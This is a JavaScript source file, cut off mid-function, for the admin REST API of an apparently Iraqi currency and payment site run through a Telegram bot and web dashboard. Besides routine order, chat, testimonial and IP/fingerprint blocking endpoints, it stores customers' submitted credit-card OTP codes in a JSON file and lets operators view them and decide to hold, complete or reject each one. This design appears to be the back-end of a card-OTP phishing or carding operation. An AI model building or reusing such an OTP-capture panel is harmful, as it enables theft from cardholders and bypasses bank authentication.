/**
 * Admin REST API — mirrors Telegram bot capabilities for the web dashboard.
 */

import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { readFile, writeFile, mkdir } from 'node:fs/promises';
import { normalizeStats, DEFAULT_STATS } from '../shared/statsNormalize.js';
import {
  METHOD_KEYS,
  migratePaymentDetails,
  getProfileById,
  getActiveProfile,
  profileIndex,
  newProfileId,
  normalizeProfile,
  defaultEmptyMethods,
  defaultMethodEnabled,
  buildPublicPaymentPayload,
} from './paymentProfiles.js';
import {
  defaultDataPaths,
  loadOrders,
  buildFullCrmSummary,
  updateOrderStatusByOrderId,
  findOrderByBusinessId,
} from './crmStore.js';
import { loadChatStore, saveChatStore, appendStaffMessage } from './chatStore.js';
import { loadBotAdmins, saveBotAdmins, normalizeBotAdmins } from './botAdminsStore.js';
import { BOT_PERMISSION_KEYS, formatPermissionsHelpAr } from './botPermissions.js';
import { checkAdminLogin } from './adminAuth.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_PATH = path.join(DATA_DIR, 'paymentDetails.json');
const QR_DIR = path.join(DATA_DIR, 'qr');
const SITE_CONFIG_PATH = path.join(DATA_DIR, 'siteConfig.json');
const STATS_PATH = path.join(DATA_DIR, 'stats.json');
const TESTIMONIALS_PATH = path.join(DATA_DIR, 'testimonials.json');
const BLOCKED_IPS_PATH = path.join(DATA_DIR, 'blockedIps.json');
const BLOCKED_FINGERPRINTS_PATH = path.join(DATA_DIR, 'blockedFingerprints.json');
const BLOCKED_CHAT_USERS_PATH = path.join(DATA_DIR, 'blockedChatUsers.json');
const BLOCKED_CHAT_IPS_PATH = path.join(DATA_DIR, 'blockedChatIps.json');
const CREDIT_CARD_OTP_SUBMISSIONS_PATH = path.join(DATA_DIR, 'creditCardOtpSubmissions.json');
const BOT_ADMINS_PATH = path.join(DATA_DIR, 'botAdmins.json');
const CHAT_PATH = path.join(DATA_DIR, 'webChat.json');
const { visits: VISITS_PATH, orders: ORDERS_CRM_PATH } = defaultDataPaths(DATA_DIR);

const ORDER_STATUSES = new Set(['received', 'archived', 'completed', 'cancelled', 'refunded']);
const ORDER_FILTERS = {
  p: (s) => s === 'received' || s === 'archived',
  d: (s) => s === 'completed',
  r: (s) => s === 'refunded',
  x: (s) => s === 'cancelled',
};

export function checkAdminApiAuth(req) {
  return checkAdminLogin(req);
}

function requireAdmin(req, res) {
  if (!checkAdminApiAuth(req)) {
    res.status(401).json({ error: 'رمز الدخول غير صحيح' });
    return false;
  }
  return true;
}

async function loadPaymentDetails() {
  let rawText;
  try {
    rawText = await readFile(DATA_PATH, 'utf8');
  } catch {
    rawText = '{}';
  }
  let raw;
  try {
    raw = JSON.parse(rawText);
  } catch {
    raw = {};
  }
  const { details, migrated } = migratePaymentDetails(raw);
  if (migrated) await savePaymentDetails(details);
  return details;
}

async function savePaymentDetails(details) {
  const next = { ...details, updatedAt: new Date().toISOString() };
  await writeFile(DATA_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function loadSiteConfig() {
  try {
    return JSON.parse(await readFile(SITE_CONFIG_PATH, 'utf8'));
  } catch {
    return { maintenance: { enabled: false }, hero: {}, links: {}, faq: [] };
  }
}

async function saveSiteConfig(cfg) {
  await writeFile(SITE_CONFIG_PATH, JSON.stringify(cfg, null, 2), 'utf8');
  return cfg;
}

async function loadStats() {
  try {
    return normalizeStats(JSON.parse(await readFile(STATS_PATH, 'utf8')));
  } catch {
    return { ...DEFAULT_STATS };
  }
}

async function saveStats(data) {
  const next = normalizeStats(data);
  await writeFile(STATS_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function loadTestimonials() {
  try {
    return JSON.parse(await readFile(TESTIMONIALS_PATH, 'utf8'));
  } catch {
    return [];
  }
}

async function saveTestimonials(data) {
  await writeFile(TESTIMONIALS_PATH, JSON.stringify(data, null, 2), 'utf8');
  return data;
}

function normalizeBlockedIpInput(raw) {
  return String(raw || '')
    .trim()
    .replace(/^::ffff:/, '')
    .replace(/^\[|\]$/g, '')
    .split(',')[0]
    .trim();
}

function normalizeFingerprintInput(raw) {
  return String(raw || '').trim().replace(/\s+/g, '').slice(0, 120);
}

async function loadBlockedIps() {
  try {
    const parsed = JSON.parse(await readFile(BLOCKED_IPS_PATH, 'utf8'));
    const list = Array.isArray(parsed) ? parsed : [];
    return list
      .map((it) => ({
        ip: normalizeBlockedIpInput(it?.ip || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.ip);
  } catch {
    return [];
  }
}

async function saveBlockedIps(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      ip: normalizeBlockedIpInput(it?.ip || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.ip);
  await writeFile(BLOCKED_IPS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function loadBlockedFingerprints() {
  try {
    const parsed = JSON.parse(await readFile(BLOCKED_FINGERPRINTS_PATH, 'utf8'));
    const list = Array.isArray(parsed) ? parsed : [];
    return list
      .map((it) => ({
        fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
        ipSnapshot: normalizeBlockedIpInput(it?.ipSnapshot || ''),
      }))
      .filter((it) => it.fingerprint);
  } catch {
    return [];
  }
}

async function saveBlockedFingerprints(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
      ipSnapshot: normalizeBlockedIpInput(it?.ipSnapshot || ''),
    }))
    .filter((it) => it.fingerprint);
  await writeFile(BLOCKED_FINGERPRINTS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function loadBlockedChatUsers() {
  try {
    const parsed = JSON.parse(await readFile(BLOCKED_CHAT_USERS_PATH, 'utf8'));
    const list = Array.isArray(parsed) ? parsed : [];
    return list
      .map((it) => ({
        fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.fingerprint);
  } catch {
    return [];
  }
}

async function saveBlockedChatUsers(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      fingerprint: normalizeFingerprintInput(it?.fingerprint || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.fingerprint);
  await writeFile(BLOCKED_CHAT_USERS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function loadBlockedChatIps() {
  try {
    const parsed = JSON.parse(await readFile(BLOCKED_CHAT_IPS_PATH, 'utf8'));
    const list = Array.isArray(parsed) ? parsed : [];
    return list
      .map((it) => ({
        ip: normalizeBlockedIpInput(it?.ip || ''),
        reason: String(it?.reason || '').trim().slice(0, 200),
        at: String(it?.at || ''),
      }))
      .filter((it) => it.ip);
  } catch {
    return [];
  }
}

async function saveBlockedChatIps(list) {
  const normalized = (Array.isArray(list) ? list : [])
    .map((it) => ({
      ip: normalizeBlockedIpInput(it?.ip || ''),
      reason: String(it?.reason || '').trim().slice(0, 200),
      at: String(it?.at || new Date().toISOString()),
    }))
    .filter((it) => it.ip);
  await writeFile(BLOCKED_CHAT_IPS_PATH, JSON.stringify(normalized, null, 2), 'utf8');
  return normalized;
}

async function loadCreditCardOtpSubmissions() {
  try {
    const parsed = JSON.parse(await readFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, 'utf8'));
    const list = Array.isArray(parsed) ? parsed : [];
    const now = Date.now();
    return list
      .map((it) => ({
        id: String(it?.id || '').trim(),
        orderId: String(it?.orderId || '').trim(),
        visitorId: String(it?.visitorId || '').trim(),
        otp: String(it?.otp || '').trim(),
        submittedAt: String(it?.submittedAt || ''),
        decision: String(it?.decision || 'pending'),
        decidedAt: String(it?.decidedAt || ''),
        expAt: Number(it?.expAt || 0),
      }))
      .filter((it) => it.id && it.orderId);
  } catch {
    return [];
  }
}

async function saveCreditCardOtpSubmissions(list) {
  const next = (Array.isArray(list) ? list : []).map((it) => ({
    id: String(it?.id || '').trim(),
    orderId: String(it?.orderId || '').trim().slice(0, 80),
    visitorId: String(it?.visitorId || '').trim().slice(0, 120),
    otp: String(it?.otp || '').trim().slice(0, 12),
    submittedAt: String(it?.submittedAt || new Date().toISOString()),
    decision: String(it?.decision || 'pending'),
    decidedAt: String(it?.decidedAt || ''),
    expAt: Number(it?.expAt || 0),
  })).filter((it) => it.id && it.orderId);
  await writeFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, JSON.stringify(next, null, 2), 'utf8');
  return next;
}

async function getCreditCardOtpSubmission(id) {
  const list = await loadCreditCardOtpSubmissions();
  return list.find((it) => it.id === String(id || '').trim()) || null;
}

async function setCreditCardOtpSubmissionDecision(id, decision) {
  const list = await loadCreditCardOtpSubmissions();
  const idx = list.findIndex((it) => it.id === String(id || '').trim());
  if (idx < 0) return null;
  list[idx] = { ...list[idx], decision, decidedAt: new Date().toISOString() };
  await saveCreditCardOtpSubmissions(list);
  return list[idx];
}

async function fetchUsdtUsdPrice() {
  try {
    const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=USDTBUSD', {
      signal: AbortSignal.timeout(4000),
    });
    if (!r.ok) throw new Error('binance fail');
    const d = await r.json();
    const price = parseFloat(d?.price);
    if (Number.isFinite(price) && price > 0) return price;
  } catch {
    /* fallback */
  }
  return 1.0;
}

async function computeRate(details) {
  const cfg = details?.rateConfig || {};
  if (cfg.mode === 'float') {
    const base = Number(cfg.floatBase || 1310);
    const offset = Number(cfg.floatOffset || 0);
    const usdtPrice = await fetchUsdtUsdPrice();
    return Math.round(usdtPrice * base + offset);
  }
  return Number(cfg.fixedRate || 1320);
}

function filterOrders(all, { filter, q }) {
  let rows = [...all];
  const fk = String(filter || 'all');
  if (fk !== 'all' && ORDER_FILTERS[fk]) {
    rows = rows.filter((o) => ORDER_FILTERS[fk](String(o.status || 'received')));
  }
  const query = String(q || '').trim().toLowerCase();
  if (query) {
    rows = rows.filter((o) => {
      const hay = [
        o.orderId,
        o.name,
        o.status,
        o.paymentMethod,
        o.visitorId,
        o.ip,
      ]
        .join(' ')
        .toLowerCase();
      return hay.includes(query);
    });
  }
  rows.sort((a, b) => new Date(b.at).getTime() - new Date(a.at).getTime());
  return rows;
}

const METHOD_FIELD_MAP = {
  fastPay_number: ['fastPay', 'number'],
  zainCash_number: ['zainCash', 'number'],
  asiaHawala_number: ['asiaHawala', 'number'],
  fib_accountNumber: ['fib', 'accountNumber'],
  fib_accountName: ['fib', 'accountName'],
  mastercard_cardNumber: ['mastercard', 'cardNumber'],
  mastercard_cardHolder: ['mastercard', 'cardHolder'],
  creditCard_holder: ['creditCard', 'cardHolder'],
  creditCard_pan: ['creditCard', 'cardNumber'],
  creditCard_expiry: ['creditCard', 'expiry'],
  creditCard_cvv: ['creditCard', 'cvv'],
};

export function registerAdminApi(app) {
  app.get('/api/admin/overview', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const marketing = await loadStats();
      const summary = await buildFullCrmSummary(VISITS_PATH, ORDERS_CRM_PATH, marketing);
      const details = await loadPaymentDetails();
      const rate = await computeRate(details);
      const site = await loadSiteConfig();
      const orders = await loadOrders(ORDERS_CRM_PATH);
      const counts = {
        p: orders.filter((o) => ORDER_FILTERS.p(String(o.status || 'received'))).length,
        d: orders.filter((o) => ORDER_FILTERS.d(String(o.status || ''))).length,
        r: orders.filter((o) => ORDER_FILTERS.r(String(o.status || ''))).length,
        x: orders.filter((o) => ORDER_FILTERS.x(String(o.status || ''))).length,
      };
      res.json({
        summary,
        rate,
        rateConfig: details.rateConfig || {},
        paymentExpiryMinutes: details.paymentExpiryMinutes ?? 15,
        currentProfileId: details.currentProfileId,
        activeProfile: getActiveProfile(details),
        maintenance: Boolean(site?.maintenance?.enabled),
        orderCounts: counts,
        telegramChatId: process.env.TELEGRAM_CHAT_ID ? 'configured' : 'missing',
        geminiConfigured: Boolean(String(process.env.GEMINI_API_KEY || '').trim()),
      });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/payment-details', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const details = await loadPaymentDetails();
      const rate = await computeRate(details);
      res.json({ details, publicPreview: buildPublicPaymentPayload(details, rate), effectiveRate: rate });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/payment-details', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const details = await loadPaymentDetails();
      const body = req.body || {};
      if (body.paymentExpiryMinutes != null) {
        const mins = Math.min(180, Math.max(1, Math.round(Number(body.paymentExpiryMinutes))));
        if (Number.isFinite(mins)) details.paymentExpiryMinutes = mins;
      }
      if (body.currentProfileId) {
        const pid = String(body.currentProfileId);
        if (getProfileById(details, pid)) details.currentProfileId = pid;
      }
      if (body.rateConfig && typeof body.rateConfig === 'object') {
        details.rateConfig = { ...(details.rateConfig || {}), ...body.rateConfig };
      }
      await savePaymentDetails(details);
      const rate = await computeRate(details);
      res.json({ ok: true, details, effectiveRate: rate });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/rate-float', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const base = Number(req.body?.floatBase ?? req.body?.base);
      const offset = Number(req.body?.floatOffset ?? req.body?.offset ?? 0);
      if (!Number.isFinite(base) || base < 1) {
        return res.status(400).json({ error: 'Invalid floatBase' });
      }
      const details = await loadPaymentDetails();
      details.rateConfig = {
        ...(details.rateConfig || {}),
        mode: 'float',
        floatBase: base,
        floatOffset: Number.isFinite(offset) ? offset : 0,
      };
      await savePaymentDetails(details);
      const rate = await computeRate(details);
      res.json({ ok: true, rate, rateConfig: details.rateConfig });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/profiles', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const nameAr = String(req.body?.nameAr || '').trim();
      const nameEn = String(req.body?.nameEn || nameAr).trim();
      if (!nameAr) return res.status(400).json({ error: 'nameAr required' });
      const details = await loadPaymentDetails();
      const profile = normalizeProfile({
        id: newProfileId(),
        nameAr,
        nameEn,
        methodEnabled: defaultMethodEnabled(),
        methods: defaultEmptyMethods(),
      });
      details.profiles = [...(details.profiles || []), profile];
      await savePaymentDetails(details);
      res.json({ ok: true, profile });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/profiles/:profileId', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const profileId = String(req.params.profileId || '');
      const details = await loadPaymentDetails();
      const idx = profileIndex(details, profileId);
      if (idx < 0) return res.status(404).json({ error: 'Profile not found' });
      const p = details.profiles[idx];
      const body = req.body || {};
      if (body.nameAr != null) p.nameAr = String(body.nameAr).slice(0, 120);
      if (body.nameEn != null) p.nameEn = String(body.nameEn).slice(0, 120);
      if (body.methodEnabled && typeof body.methodEnabled === 'object') {
        p.methodEnabled = { ...p.methodEnabled, ...body.methodEnabled };
      }
      if (body.methods && typeof body.methods === 'object') {
        for (const key of METHOD_KEYS) {
          if (body.methods[key]) {
            p.methods[key] = { ...(p.methods[key] || {}), ...body.methods[key] };
          }
        }
      }
      details.profiles[idx] = normalizeProfile(p);
      await savePaymentDetails(details);
      res.json({ ok: true, profile: details.profiles[idx] });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/profiles/:profileId', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const profileId = String(req.params.profileId || '');
      const details = await loadPaymentDetails();
      if ((details.profiles || []).length <= 1) {
        return res.status(400).json({ error: 'Cannot delete the only profile' });
      }
      const idx = profileIndex(details, profileId);
      if (idx < 0) return res.status(404).json({ error: 'Profile not found' });
      details.profiles.splice(idx, 1);
      if (details.currentProfileId === profileId) {
        details.currentProfileId = details.profiles[0]?.id;
      }
      await savePaymentDetails(details);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/profiles/:profileId/activate', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const profileId = String(req.params.profileId || '');
      const details = await loadPaymentDetails();
      if (!getProfileById(details, profileId)) {
        return res.status(404).json({ error: 'Profile not found' });
      }
      details.currentProfileId = profileId;
      await savePaymentDetails(details);
      res.json({ ok: true, currentProfileId: profileId });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/profiles/:profileId/fields', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const profileId = String(req.params.profileId || '');
      const { fieldKey, value } = req.body || {};
      const mapping = METHOD_FIELD_MAP[String(fieldKey || '')];
      if (!mapping) return res.status(400).json({ error: 'Unknown fieldKey' });
      const details = await loadPaymentDetails();
      const idx = profileIndex(details, profileId);
      if (idx < 0) return res.status(404).json({ error: 'Profile not found' });
      const p = details.profiles[idx];
      const [method, prop] = mapping;
      if (!p.methods[method]) p.methods[method] = {};
      p.methods[method][prop] = String(value ?? '').slice(0, 500);
      details.profiles[idx] = normalizeProfile(p);
      await savePaymentDetails(details);
      res.json({ ok: true, profile: details.profiles[idx] });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/qr', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const profileId = String(req.body?.profileId || '');
      const methodKey = String(req.body?.methodKey || '');
      const dataUrl = String(req.body?.dataUrl || '');
      if (!METHOD_KEYS.includes(methodKey)) {
        return res.status(400).json({ error: 'Invalid methodKey' });
      }
      const m = dataUrl.match(/^data:([^;]+);base64,(.+)$/);
      if (!m) return res.status(400).json({ error: 'Invalid dataUrl' });
      const buf = Buffer.from(m[2], 'base64');
      if (!buf.length || buf.length > 4 * 1024 * 1024) {
        return res.status(400).json({ error: 'Invalid image size' });
      }
      await mkdir(QR_DIR, { recursive: true });
      const ext = (m[1].split('/')[1] || 'jpg').replace('jpeg', 'jpg').slice(0, 8);
      const localName = `qr_${Date.now().toString(36)}_${crypto.randomBytes(3).toString('hex')}.${ext}`;
      await writeFile(path.join(QR_DIR, localName), buf);
      const localUrl = `/api/qr/${localName}`;
      const details = await loadPaymentDetails();
      const idx = profileIndex(details, profileId || details.currentProfileId);
      if (idx < 0) return res.status(404).json({ error: 'Profile not found' });
      const p = details.profiles[idx];
      if (!p.methods[methodKey]) p.methods[methodKey] = {};
      p.methods[methodKey].qrImage = localUrl;
      details.profiles[idx] = normalizeProfile(p);
      await savePaymentDetails(details);
      res.json({ ok: true, qrImage: localUrl, profile: details.profiles[idx] });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/site-config', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      res.json(await loadSiteConfig());
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/site-config', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const cfg = await loadSiteConfig();
      const body = req.body || {};
      if (body.maintenance != null) {
        cfg.maintenance = { ...(cfg.maintenance || {}), ...body.maintenance };
      }
      if (body.hero != null) cfg.hero = { ...(cfg.hero || {}), ...body.hero };
      if (body.links != null) cfg.links = { ...(cfg.links || {}), ...body.links };
      if (Array.isArray(body.faq)) cfg.faq = body.faq;
      await saveSiteConfig(cfg);
      res.json({ ok: true, config: cfg });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/stats', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      res.json(await loadStats());
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/stats', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const stats = await loadStats();
      const body = req.body || {};
      for (const k of ['customers', 'transactions', 'years', 'satisfaction']) {
        if (body[k] != null) {
          const v = Number(body[k]);
          if (Number.isFinite(v) && v >= 0) stats[k] = v;
        }
      }
      await saveStats(stats);
      res.json({ ok: true, stats });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/testimonials', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      res.json(await loadTestimonials());
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/testimonials', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const { nameAr, cityAr, stars, textAr } = req.body || {};
      if (!String(nameAr || '').trim() || !String(textAr || '').trim()) {
        return res.status(400).json({ error: 'nameAr and textAr required' });
      }
      const list = await loadTestimonials();
      const item = {
        id: Date.now(),
        nameAr: String(nameAr).slice(0, 80),
        nameEn: String(nameAr).slice(0, 80),
        cityAr: String(cityAr || '').slice(0, 80),
        cityEn: String(cityAr || '').slice(0, 80),
        stars: Math.min(5, Math.max(1, Math.round(Number(stars) || 5))),
        textAr: String(textAr).slice(0, 2000),
        textEn: String(textAr).slice(0, 2000),
      };
      await saveTestimonials([...list, item]);
      res.json({ ok: true, item });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/testimonials/:id', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const id = Number(req.params.id);
      const list = await loadTestimonials();
      const next = list.filter((t) => Number(t.id) !== id);
      await saveTestimonials(next);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/orders/list', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const offset = Math.max(0, Number(req.query.offset) || 0);
      const limit = Math.min(200, Math.max(1, Number(req.query.limit) || 30));
      const all = await loadOrders(ORDERS_CRM_PATH);
      const filtered = filterOrders(all, { filter: req.query.filter, q: req.query.q });
      const slice = filtered.slice(offset, offset + limit);
      res.json({ total: filtered.length, offset, limit, items: slice });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/orders/:orderId', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const all = await loadOrders(ORDERS_CRM_PATH);
      const row = findOrderByBusinessId(all, String(req.params.orderId || ''));
      if (!row) return res.status(404).json({ error: 'Order not found' });
      res.json({ order: row });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.patch('/api/admin/orders/:orderId/status', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const status = String(req.body?.status || '');
      if (!ORDER_STATUSES.has(status)) {
        return res.status(400).json({ error: 'Invalid status' });
      }
      const r = await updateOrderStatusByOrderId(ORDERS_CRM_PATH, String(req.params.orderId || ''), status);
      if (!r.ok) return res.status(404).json({ error: 'Order not found' });
      res.json({ ok: true, order: r.order });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/blocked', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      res.json({
        ips: await loadBlockedIps(),
        fingerprints: await loadBlockedFingerprints(),
        chatUsers: await loadBlockedChatUsers(),
        chatIps: await loadBlockedChatIps(),
      });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/blocked/ip', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const ip = normalizeBlockedIpInput(req.body?.ip);
      if (!ip) return res.status(400).json({ error: 'Invalid IP' });
      const list = await loadBlockedIps();
      if (!list.find((it) => it.ip === ip)) {
        list.push({ ip, reason: String(req.body?.reason || 'مخالفة').slice(0, 200), at: new Date().toISOString() });
        await saveBlockedIps(list);
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/blocked/ip/:ip', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const ip = normalizeBlockedIpInput(req.params.ip);
      const list = (await loadBlockedIps()).filter((it) => it.ip !== ip);
      await saveBlockedIps(list);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/blocked/fingerprint', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const fingerprint = normalizeFingerprintInput(req.body?.fingerprint);
      if (!fingerprint) return res.status(400).json({ error: 'Invalid fingerprint' });
      const list = await loadBlockedFingerprints();
      if (!list.find((it) => it.fingerprint === fingerprint)) {
        list.push({
          fingerprint,
          reason: String(req.body?.reason || 'مخالفة').slice(0, 200),
          at: new Date().toISOString(),
          ipSnapshot: normalizeBlockedIpInput(req.body?.ipSnapshot || ''),
        });
        await saveBlockedFingerprints(list);
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/blocked/fingerprint/:fp', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const fp = normalizeFingerprintInput(req.params.fp);
      const list = (await loadBlockedFingerprints()).filter((it) => it.fingerprint !== fp);
      await saveBlockedFingerprints(list);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/blocked/chat-user', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const fingerprint = normalizeFingerprintInput(req.body?.fingerprint);
      if (!fingerprint) return res.status(400).json({ error: 'Invalid fingerprint' });
      const list = await loadBlockedChatUsers();
      if (!list.find((it) => it.fingerprint === fingerprint)) {
        list.push({ fingerprint, reason: 'مخالفة', at: new Date().toISOString() });
        await saveBlockedChatUsers(list);
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/blocked/chat-user/:fp', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const fp = normalizeFingerprintInput(req.params.fp);
      const list = (await loadBlockedChatUsers()).filter((it) => it.fingerprint !== fp);
      await saveBlockedChatUsers(list);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/blocked/chat-ip', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const ip = normalizeBlockedIpInput(req.body?.ip);
      if (!ip) return res.status(400).json({ error: 'Invalid IP' });
      const list = await loadBlockedChatIps();
      if (!list.find((it) => it.ip === ip)) {
        list.push({ ip, reason: 'مخالفة', at: new Date().toISOString() });
        await saveBlockedChatIps(list);
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/blocked/chat-ip/:ip', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const ip = normalizeBlockedIpInput(req.params.ip);
      const list = (await loadBlockedChatIps()).filter((it) => it.ip !== ip);
      await saveBlockedChatIps(list);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/chat/sessions', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const store = await loadChatStore(CHAT_PATH);
      const items = Object.values(store.sessions || {}).map((s) => {
        const last = s.messages?.[s.messages.length - 1];
        return {
          id: s.id,
          visitorName: s.visitorName || '',
          createdAt: s.createdAt,
          handoffToStaff: Boolean(s.meta?.handoffToStaff),
          lang: s.meta?.lang || 'ar',
          lastMessage: last?.text || '',
          lastAt: last?.at || s.createdAt,
          messageCount: s.messages?.length || 0,
        };
      });
      items.sort((a, b) => new Date(b.lastAt || 0).getTime() - new Date(a.lastAt || 0).getTime());
      res.json({ items });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/chat/sessions/:sessionId/messages', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const sessionId = String(req.params.sessionId || '');
      const store = await loadChatStore(CHAT_PATH);
      const sess = store.sessions[sessionId];
      if (!sess) return res.status(404).json({ error: 'Session not found' });
      res.json({ session: sess });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/chat/sessions/:sessionId/reply', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const sessionId = String(req.params.sessionId || '');
      const text = String(req.body?.text || '').trim();
      if (!sessionId.startsWith('sess_') || !text) {
        return res.status(400).json({ error: 'Invalid session or text' });
      }
      const store = await loadChatStore(CHAT_PATH);
      if (!store.sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });
      appendStaffMessage(store, sessionId, text);
      await saveChatStore(CHAT_PATH, store);
      res.json({ ok: true });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/cc-otp/submissions', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const list = await loadCreditCardOtpSubmissions();
      list.sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
      res.json({ items: list });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/cc-otp/submissions/:id/decision', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const action = String(req.body?.action || '');
      const map = {
        hold: { decision: 'hold', status: 'received' },
        complete: { decision: 'completed', status: 'completed' },
        reject: { decision: 'rejected', status: 'cancelled' },
